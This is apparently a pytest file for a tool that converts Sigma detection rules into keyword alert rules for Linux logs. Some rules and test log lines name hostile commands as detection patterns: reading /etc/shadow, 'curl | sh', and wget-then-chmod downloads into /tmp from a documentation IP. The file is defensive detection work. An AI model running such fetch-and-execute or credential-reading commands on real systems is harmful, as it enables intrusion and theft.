"""Rewriting Sigma rules as keyword rules: ``python -m app.sigma``."""

from datetime import UTC, datetime
from types import SimpleNamespace

import pytest
import yaml

from app import sigma
from app.rules import load_rules
from app.rules.engine import detect
from app.rules.schema import RULE
from app.sigma import NotConvertible, convert


def line(message: str, service: str = "sudo"):
    """An event as the rules see it."""
    return SimpleNamespace(
        id=1,
        ts=datetime(2026, 9, 9, tzinfo=UTC),
        host="web-01",
        service=service,
        level="info",
        action=None,
        user=None,
        src_ip=None,
        dst_port=None,
        message=message,
    )


def rule(**changes):
    """A Sigma rule of our own making, in the shape those of SigmaHQ have."""
    fields = {
        "title": "Shadow File Read",
        "id": "0a1b2c3d-1111-2222-3333-444455556666",
        "status": "test",
        "description": "Detects reading of\nthe shadow file.",
        "references": ["https://example.org/shadow"],
        "author": "Jane Doe, John Roe",
        "date": "2026-01-02",
        "tags": ["attack.credential-access", "attack.t1003.008"],
        "logsource": {"product": "linux"},
        "detection": {"keywords": ["cat /etc/shadow", "less /etc/shadow"], "condition": "keywords"},
        "falsepositives": ["Unknown", "Backup jobs"],
        "level": "high",
    }
    return fields | changes


def detection(condition: str, **selections):
    return rule(detection={**selections, "condition": condition})


# --- what becomes of a rule's fields ----------------------------------------------------------


def test_fields_of_a_converted_rule():
    assert convert(rule(), source="https://example.org/rules/shadow.yml") == {
        "id": "SIGMA-0a1b2c3d",
        "name": "Shadow File Read",
        "description": "Detects reading of the shadow file.",
        "type": "keyword",
        "severity": "high",
        "keywords": ["cat /etc/shadow", "less /etc/shadow"],
        "tags": ["attack.credential-access", "attack.t1003.008"],
        "false_positives": ["Backup jobs"],
        "author": "Jane Doe, John Roe",
        "source": "https://example.org/rules/shadow.yml",
        "license": sigma.LICENSE,
        "references": ["https://example.org/shadow"],
    }


def test_author_source_and_licence_stay_with_the_rule():
    """What the Detection Rule License asks of whoever passes a rule on."""
    converted = RULE.validate_python(convert(rule(), source="https://example.org/shadow.yml"))
    assert converted.author == "Jane Doe, John Roe"
    assert converted.source == "https://example.org/shadow.yml"
    assert "Detection Rule License" in converted.license
    assert "https://github.com/SigmaHQ/Detection-Rule-License" in converted.license


def test_fields_a_rule_does_not_have_are_left_out():
    bare = {name: value for name, value in rule().items() if name in sigma_required()}
    assert convert(bare) == {
        "id": "SIGMA-0a1b2c3d",
        "name": "Shadow File Read",
        "description": "",
        "type": "keyword",
        "severity": "medium",
        "keywords": ["cat /etc/shadow", "less /etc/shadow"],
        "license": sigma.LICENSE,
    }


def sigma_required() -> set[str]:
    return {"title", "id", "logsource", "detection"}


@pytest.mark.parametrize(
    ("level", "severity"),
    [
        ("informational", "low"),
        ("low", "low"),
        ("medium", "medium"),
        ("high", "high"),
        ("critical", "critical"),
    ],
)
def test_levels(level, severity):
    assert convert(rule(level=level))["severity"] == severity


@pytest.mark.parametrize(
    ("service", "programs"),
    [
        ("sshd", ["sshd"]),
        ("sudo", ["sudo"]),
        ("cron", ["cron", "CRON", "crond", "crontab"]),
        ("auth", None),  # a file many programs write to
        ("syslog", None),
        ("clamav", None),  # a log we cannot say the program names of
    ],
)
def test_rule_is_narrowed_to_a_program_only_where_the_log_is_that_programs(service, programs):
    converted = convert(rule(logsource={"product": "linux", "service": service}))
    assert converted.get("match", {}).get("service") == programs


# --- detections -------------------------------------------------------------------------------


def wanted(converted) -> tuple:
    return converted["keywords"], converted.get("require", []), converted.get("exclude", [])


def test_one_list_of_texts():
    assert wanted(convert(detection("selection", selection=["a", "b"]))) == (["a", "b"], [], [])
    assert wanted(convert(detection("selection", selection="only one"))) == (["only one"], [], [])


def test_every_text_of_an_all_list_is_required():
    converted = convert(detection("keywords", keywords={"|all": ["pkexec", "XAUTHORITY", "root"]}))
    assert wanted(converted) == (["pkexec"], ["XAUTHORITY", "root"], [])


def test_and_requires_one_text_of_each_list():
    converted = convert(detection("tools and target", tools=["scp ", "rsync "], target=["@", ":"]))
    assert wanted(converted) == (["scp ", "rsync "], [["@", ":"]], [])


def test_and_not_excludes():
    converted = convert(detection("selection and not filter", selection=["rm x"], filter=["x."]))
    assert wanted(converted) == (["rm x"], [], ["x."])


def test_all_of_and_one_of_with_a_name_pattern():
    parts = {"selection_user": ["new user"], "selection_ids": ["UID=0,", "GID=0,"], "other": ["x"]}
    assert wanted(convert(detection("all of selection_*", **parts))) == (
        ["new user"],
        [["UID=0,", "GID=0,"]],
        [],
    )
    assert wanted(convert(detection("1 of selection_*", **parts))) == (
        ["new user", "UID=0,", "GID=0,"],
        [],
        [],
    )
    assert wanted(convert(detection("1 of them", a=["x"], b=["y"]))) == (["x", "y"], [], [])
    assert wanted(convert(detection("all of them", a=["x"], b=["y"]))) == (["x"], ["y"], [])


def test_or_brackets_and_what_binds_tighter():
    parts = {"a": ["a1", "a2"], "b": ["b1"], "c": ["c1"], "d": ["d1"]}
    assert wanted(convert(detection("a or b", **parts))) == (["a1", "a2", "b1"], [], [])
    assert wanted(convert(detection("(a or b) and c", **parts))) == (["a1", "a2", "b1"], ["c1"], [])
    assert wanted(convert(detection("c and (a or b) and not (d or b)", **parts))) == (
        ["c1"],
        [["a1", "a2", "b1"]],
        ["d1", "b1"],
    )
    assert wanted(convert(detection("A AND NOT b", A=["x"], b=["y"]))) == (["x"], [], ["y"])


def test_fields_of_sudo_are_looked_for_as_sudo_writes_them():
    sudo = rule(
        logsource={"product": "linux", "service": "sudo"},
        detection={
            "selection_user": {"USER": ["#-*", "#*4294967295"]},
            "condition": "selection_user",
        },
    )
    converted = convert(sudo)
    assert converted["keywords"] == ["USER=#-*", "USER=#*4294967295"]
    assert converted["match"] == {"service": ["sudo"]}

    two_fields = rule(
        logsource={"product": "linux", "service": "sudo"},
        detection={
            "selection": {"USER": "root", "TTY": ["pts/0", "pts/1"]},
            "condition": "selection",
        },
    )
    assert wanted(convert(two_fields)) == (["USER=root"], [["TTY=pts/0", "TTY=pts/1"]], [])


def test_keywords_are_taken_as_they_are_except_for_the_question_mark():
    texts = ["wget *; chmod +x", r"rm \*", r"C:\\*\temp", r"what\?"]
    assert convert(detection("s", s=texts))["keywords"] == [
        "wget *; chmod +x",
        r"rm \*",
        r"C:\\*\temp",
        "what?",
    ]


# --- what cannot be converted, and why --------------------------------------------------------


@pytest.mark.parametrize(
    ("changes", "reason"),
    [
        (
            {"logsource": {"product": "linux", "category": "process_creation"}},
            "needs process_creation records",
        ),
        ({"logsource": {"category": "firewall"}}, "needs firewall records"),
        ({"logsource": {"product": "windows", "service": "security"}}, "is for windows logs"),
        ({"logsource": {"service": "sshd"}}, "does not say which logs it is for"),
        ({"logsource": {"product": "linux", "service": "auditd"}}, "needs auditd records"),
        ({"status": "deprecated"}, "is deprecated"),
        ({"title": ""}, "has no title"),
        ({"detection": {}}, "has no detection"),
    ],
)
def test_rules_for_other_logs_are_left_out_with_the_reason(changes, reason):
    with pytest.raises(NotConvertible, match=f"^{reason}$"):
        convert(rule(**changes))


@pytest.mark.parametrize(
    ("made", "reason"),
    [
        (
            detection("selection", selection={"CommandLine|contains": "x"}),
            r"looks at fields of a record \(CommandLine\|contains\)",
        ),
        (
            detection("selection", selection=[{"dst_ip": ["192.0.2.1"]}]),
            "looks at fields of a record, not at the text",
        ),
        (
            detection("selection", selection={"USER": "root"}),
            r"looks at fields of a record \(USER\)",
        ),
        (detection("selection", selection=["ab?c"]), r"uses \? for a single character"),
        (detection("selection", selection=["*"]), "looks for the empty text"),
        (detection("not filter", filter=["x"]), "only says what must not be in a line"),
        (
            detection("a and not b", a=["x"], b={"|all": ["y", "z"]}),
            "excludes a combination of texts",
        ),
        (
            detection("a or b", a=["x"], b={"|all": ["y", "z"]}),
            "offers alternatives that are more than lists",
        ),
        (detection("a and nothing", a=["x"]), r"names nothing \(nothing\)"),
        (detection("1 of sel*", a=["x"]), r"names nothing \(sel\*\)"),
        (detection("a and", a=["x"]), "condition this converter cannot read"),
        (detection("(a", a=["x"]), "condition this converter cannot read"),
        (detection("a b", a=["x"], b=["y"]), "condition this converter cannot read"),
        (
            detection("selection | count() > 5", selection=["x"]),
            "condition this converter cannot read",
        ),
        (rule(detection={"a": ["x"], "condition": ["a", "a"]}), "has several conditions or none"),
        (rule(detection={"a": ["x"]}), "has several conditions or none"),
        (rule(id="not valid as an id"), "gives a rule that does not load"),
    ],
)
def test_what_keyword_rules_cannot_express_is_left_out_with_the_reason(made, reason):
    with pytest.raises(NotConvertible, match=reason):
        convert(made)


# --- the converted rule does what the Sigma rule says -----------------------------------------


def test_converted_rule_alerts_on_the_lines_the_sigma_rule_describes():
    made = detection(
        "(tools or shells) and all of where_* and not harmless",
        tools=["wget *; chmod +x", "curl * | sh"],
        shells={"|all": ["bash -i"]},
        where_dir=["/tmp/", "/dev/shm/"],
        where_net=["http"],
        harmless=["--dry-run"],
    )
    converted = RULE.validate_python(convert(made))

    def alerts(message: str) -> bool:
        return bool(detect(converted, [line(message)]))

    assert alerts("COMMAND=/bin/sh -c wget http://198.51.100.9/a -O /tmp/a; chmod +x /tmp/a")
    assert alerts("COMMAND=/bin/sh -c curl http://198.51.100.9/a | sh; ls /dev/shm/")
    assert alerts("COMMAND=/bin/bash -i >& /tmp/http")
    assert not alerts("COMMAND=/bin/sh -c wget http://198.51.100.9/a; chmod +x a")  # nowhere to
    assert not alerts("COMMAND=/bin/sh -c wget ftp://198.51.100.9/a -O /tmp/a; chmod +x /tmp/a")
    assert not alerts("COMMAND=/bin/sh -c wget --dry-run http://x/a -O /tmp/a; chmod +x /tmp/a")
    assert not alerts("COMMAND=/usr/bin/ls /tmp/ http")


# --- the command ------------------------------------------------------------------------------


@pytest.fixture
def repository(tmp_path):
    """A small copy of a Sigma repository: two rules that convert, three that do not."""
    files = {
        "rules/linux/builtin/lnx_shadow.yml": rule(),
        "rules/linux/builtin/sshd/lnx_sshd_error.yml": rule(
            id="99999999-0000-0000-0000-000000000000",
            title='Odd "SSH": error',
            logsource={"product": "linux", "service": "sshd"},
            detection=detection("k", k=["fatal: bad string", " trailing space "])["detection"],
        ),
        "rules/linux/process_creation/proc.yml": rule(
            logsource={"product": "linux", "category": "process_creation"}
        ),
        "rules/windows/win.yml": rule(logsource={"product": "windows", "service": "security"}),
        "rules/linux/builtin/broken.yml": "title: [unclosed",
        "rules/linux/builtin/notes.txt": "not a rule",
    }
    for name, content in files.items():
        path = tmp_path / "sigma" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content if isinstance(content, str) else yaml.safe_dump(content))
    return tmp_path / "sigma"


def test_command_writes_rule_files_that_load(repository, tmp_path, capsys):
    out = tmp_path / "rules" / "sigma"
    code = sigma.main(
        [
            "--root",
            str(repository),
            "--ref",
            "abc123",
            "--out",
            str(out),
            "rules/linux",
            "rules/windows",
        ]
    )
    assert code == 0
    assert sorted(path.name for path in out.iterdir()) == ["lnx_shadow.yaml", "lnx_sshd_error.yaml"]

    loaded = load_rules(tmp_path / "rules")
    assert loaded.errors == ()
    shadow, sshd = loaded.rules
    assert shadow.id == "SIGMA-0a1b2c3d"
    assert shadow.source == (
        "https://github.com/SigmaHQ/sigma/blob/abc123/rules/linux/builtin/lnx_shadow.yml"
    )
    # Texts that YAML would read differently unquoted come back as they were.
    assert (sshd.name, sshd.keywords) == (
        'Odd "SSH": error',
        ["fatal: bad string", " trailing space "],
    )
    assert sshd.match.service == ["sshd"]

    text = (out / "lnx_shadow.yaml").read_text(encoding="utf-8")
    assert text.startswith("# SigmaHQ deposundaki bir kuraldan çevrildi")
    assert "# Özgün kural: rules/linux/builtin/lnx_shadow.yml\n" in text
    assert "keywords:\n  - cat /etc/shadow\n  - less /etc/shadow\n" in text

    printed = capsys.readouterr().out
    assert f"2 rules written to {out}" in printed
    assert "3 left out:" in printed
    assert "    1  needs process_creation records" in printed
    assert "    1  is for windows logs" in printed
    assert "    1  cannot be read" in printed


def test_command_lists_every_rule_left_out_when_asked(repository, tmp_path, capsys):
    arguments = ["--root", str(repository), "--out", str(tmp_path / "out"), "--reasons"]
    sigma.main([*arguments, "rules/linux/process_creation", "rules/linux/builtin/lnx_shadow.yml"])
    printed = capsys.readouterr().out
    assert "  rules/linux/process_creation/proc.yml: needs process_creation records" in printed
    # Without --ref the link points at the main branch.
    written = (tmp_path / "out" / "lnx_shadow.yaml").read_text(encoding="utf-8")
    assert "sigma/blob/master/rules/linux/builtin/lnx_shadow.yml" in written


def test_command_fails_when_nothing_could_be_converted(repository, tmp_path, capsys):
    out = tmp_path / "out"
    assert sigma.main(["--root", str(repository), "--out", str(out), "rules/windows"]) == 1
    assert not out.exists()
    assert sigma.main(["--root", str(repository), "--out", str(out), "rules/missing.yml"]) == 1
    assert "cannot be read" in capsys.readouterr().out


def test_command_refuses_files_outside_the_repository(repository, tmp_path):
    outside = tmp_path / "elsewhere.yml"
    outside.write_text(yaml.safe_dump(rule()))
    with pytest.raises(SystemExit):
        sigma.main(["--root", str(repository), "--out", str(tmp_path / "out"), str(outside)])
